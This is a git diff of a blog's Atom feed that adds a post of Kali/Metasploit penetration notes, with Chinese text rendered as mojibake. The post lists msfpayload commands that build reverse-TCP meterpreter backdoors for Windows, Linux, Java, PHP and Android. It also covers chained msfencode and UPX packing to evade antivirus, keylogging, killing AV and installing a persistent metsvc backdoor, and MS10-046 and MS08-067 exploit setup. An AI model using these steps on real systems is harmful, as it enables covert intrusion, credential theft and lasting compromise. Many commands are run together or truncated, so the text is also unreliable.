@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://rxxy.github.io/"/>
-  <updated>2016-12-26T15:38:57.338Z</updated>
+  <updated>2016-12-26T15:50:05.667Z</updated>
   <id>https://rxxy.github.io/</id>
   
   <author>
@@ -14,6 +14,44 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>kali��͸�ʼ�</title>
+    <link href="https://rxxy.github.io/2016/12/26/kali%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/"/>
+    <id>https://rxxy.github.io/2016/12/26/kali渗透笔记/</id>
+    <published>2016-12-26T15:45:39.379Z</published>
+    <updated>2016-12-26T15:50:05.667Z</updated>
+    
+    <content type="html"><![CDATA[<p>#kali��͸�ʼ�<br>WindowsshellCode usege<br>/root����ľ��hello.exe</p>
+<p>Lhost����ip</p>
+<p>Lpost�����˿�</p>
+<figure class="highlight plain"><figcaption><span>windows/meterpreter/reverse_tcp LHOST=192.168.159.128LPORT=1211 X��E>hello.exe</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">msf&gt; use exploit/multi/handler</div><div class="line">msfexploit(handler) &gt; set payloadwindows/meterpreter/reverse_tcp</div><div class="line">payload=&gt; windows/meterpreter/reverse_tcp</div><div class="line">msfexploit(handler) &gt; set LHOST 192.168.159.128</div><div class="line">LHOST=&gt; 192.168.159.128</div><div class="line">msfexploit(handler) &gt; set LPORT1211</div><div class="line">LPORT =&gt; 1211</div><div class="line">msfexploit(handler) &gt; exploit```��ʼ��������Ŀ��������ľ�����ɻ�ȡshell</div><div class="line"></div><div class="line">##### linux�¹����غ�</div><div class="line">```msfpayloadlinux/x86/meterpreter/rverse_tcp LHOST=192.168.159.128 LPORT=1212 X &gt;hello.sh</div><div class="line">msfexploit(handler) &gt; set payloadlinux/x86/meterpreter/reverse_tcp</div><div class="line">payload =&gt;linux/x86/meterpreter/reverse_tcp</div></pre></td></tr></table></figure>
+<h5 id="java�¹����غ�"><a href="#java�¹����غ�" class="headerlink" title="java�¹����غ�"></a>java�¹����غ�</h5><figure class="highlight plain"><figcaption><span>java/meterpreter/reverse_tcp LHOST=192.168.159.128 LPORT=1212 X >hello.jar```</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">##### php�¹����غ�</div><div class="line">```msfpayloadphp/meterpreter/reverse_tcpLHOST=192.168.159.128LPORT=R&gt;123.php</div></pre></td></tr></table></figure>
+<h5 id="Android�¹����غ�"><a href="#Android�¹����غ�" class="headerlink" title="Android�¹����غ�"></a>Android�¹����غ�</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfpayloadandroid/meterpreter/reverse_tcp LHOST=192.168.159.LPORT=7777 R&gt; /root/hello.apk</div></pre></td></tr></table></figure>
+<h5 id="shellCode��m"><a href="#shellCode��m" class="headerlink" title="shellCode��ɱ"></a>shellCode��ɱ</h5><h5 id="���ر�����m-��-��"><a href="#���ر�����m-��-��" class="headerlink" title="���ر�����ɱ(��)��"></a>���ر�����ɱ(��)��</h5><figure class="highlight plain"><figcaption><span>LPORT=R|Msfencode -ex86/shikata_ga_nai -c 5 -t raw | msfencode -e x86/alpha_upper -c 2 -t raw |msfencode -e x86/shikata_ga_nai -c 5 -t raw | msfencode -e x86/countdown -c 5-t exe -o</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">-o/root/hello.exe</div></pre></td></tr></table></figure>
+<h5 id="�ӿ�"><a href="#�ӿ�" class="headerlink" title="�ӿ�"></a>�ӿ�</h5><p>Upx-5hello.exe</p>
+<h5 id="meterpreter��������"><a href="#meterpreter��������" class="headerlink" title="meterpreter��������"></a>meterpreter��������</h5><blockquote>
+<p>screenshot����<br>sysinfoϵͳ��Ϣ<br>ps�鿴����<br>migrate 1323�л����̣�ʹľ���Ĵ������������ϣ�<br>Run post/windows/capture/keylog_recorder��¼��������</p>
+</blockquote>
+<h5 id="�־y���"><a href="#�־y���" class="headerlink" title="�־ÿ���"></a>�־ÿ���</h5><p>runpost/windows/manage/migrate�Զ��л�����<br>run killav�ر��������е�cmd<br>��������װ����<br>runmetsvc -A��װ����<br>ʹ�ú��ţ�<br>use exploit/multi/handler<br>setpayloadwindows/metsvc_bind_tcp<br>set RHOST 192.168.159.1<br>set LPORT 31337<br>exploit</p>
+<h5 id="©�����a�"><a href="#©�����a�" class="headerlink" title="©�����ã�"></a>©�����ã�</h5><p>Ms10-046<br>useexploit/windows/browser/ms10_046_shortcut_icon_dllloader<br>SRVHOSTLHOST����Ϊ����ip<br>Payload��set payload windows/shell/reverse_tcp</p>
+<p>Ms08-067<br>set payloadwindows/meterpreter/reverse_tcp<br>RHOSTLHOST</p>
+<blockquote>
+<p>Targets:<br>0Automatic Targeting<br> 1Windows 2000 Universal<br> 2Windows XP SP0/SP1 Universal<br> 3Windows 2003 SP0 Universal<br> 4Windows XP SP2 English (AlwaysOn NX)<br> 5Windows XP SP2 English (NX)<br> 6Windows XP SP3 English (AlwaysOn NX)<br> 7Windows XP SP3 English (NX)<br> 8Windows XP SP2 Arabic (NX)<br> 9Windows XP SP2 Chinese - Traditional / Taiwan (NX)<br> Windows XP SP2 Chinese - Simplified (NX)<br> Windows XP SP2 Chinese - Traditional (NX)<br> Windows XP SP2 Czech (NX)<br> Windows XP SP2 Danish (NX)<br> Windows XP SP2 German (NX)<br> Windows XP SP2 Greek (NX)<br> Windows XP SP2 Spanish (NX)<br> Windows XP SP2 Finnish (NX)<br> Windows XP SP2 French (NX)<br> Windows XP SP2 Hebrew (NX)<br> Windows XP SP2 Hungarian (NX)<br> Windows XP SP2 Italian (NX)<br> Windows XP SP2 Japanese (NX)<br> Windows XP SP2 Korean (NX)<br> Windows XP SP2 Dutch (NX)<br> Windows XP SP2 Norwegian (NX)<br> Windows XP SP2 Polish (NX)<br> Windows XP SP2 Portuguese - Brazilian (NX)<br> Windows XP SP2 Portuguese (NX)<br> Windows XP SP2 Russian (NX)<br> Windows XP SP2 Swedish (NX)<br> Windows XP SP2 Turkish (NX)<br> Windows XP SP3 Arabic (NX)<br> Windows XP SP3 Chinese - Traditional / Taiwan (NX)<br> Windows XP SP3 Chinese - Simplified (NX)<br> Windows XP SP3 Chinese - Traditional (NX)<br> Windows XP SP3 Czech (NX)<br> Windows XP SP3 Danish (NX)<br> Windows XP SP3 German (NX)<br> Windows XP SP3 Greek (NX)<br> Windows XP SP3 Spanish (NX)<br> Windows XP SP3 Finnish (NX)<br> Windows XP SP3 French (NX)<br> Windows XP SP3 Hebrew (NX)<br> Windows XP SP3 Hungarian (NX)<br> Windows XP SP3 Italian (NX)<br> Windows XP SP3 Japanese (NX)<br> Windows XP SP3 Korean (NX)<br> Windows XP SP3 Dutch (NX)<br> Windows XP SP3 Norwegian (NX)<br> Windows XP SP3 Polish (NX)<br> Windows XP SP3 Portuguese - Brazilian (NX)<br> Windows XP SP3 Portuguese (NX)<br> Windows XP SP3 Russian (NX)<br> Windows XP SP3 Swedish (NX)<br> Windows XP SP3 Turkish (NX)<br> Windows 2003 SP1 English (NO NX)<br> Windows 2003 SP1 English (NX)<br> Windows 2003 SP1 Japanese (NO NX)<br> Windows 2003 SP1 Spanish (NO NX)<br> Windows 2003 SP1 Spanish (NX)<br> Windows 2003 SP2 English (NO NX)<br> Windows 2003 SP2 English (NX)<br> Windows 2003 SP2 German (NO NX)<br> Windows 2003 SP2 German (NX)<br> Windows 2003 SP2 Portuguese - Brazilian (NX)<br> Windows 2003 SP2 Spanish (NO NX)<br> Windows 2003 SP2 Spanish (NX)<br> Windows 2003 SP2 Japanese (NO NX)</p>
+</blockquote>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;#kali��͸�ʼ�&lt;br&gt;WindowsshellCode usege&lt;br&gt;/root����ľ��hello.exe&lt;/p&gt;
+&lt;p&gt;Lhost����ip&lt;/p&gt;
+&lt;p&gt;Lpost�����˿�&lt;/p&gt;
+&lt;figure class=&quot;highlight plain&quot;
+    
+    </summary>
+    
+    
+  </entry>
   
   <entry>
     <title>Tomcat 启动卡在部署项目时（linux）</title>
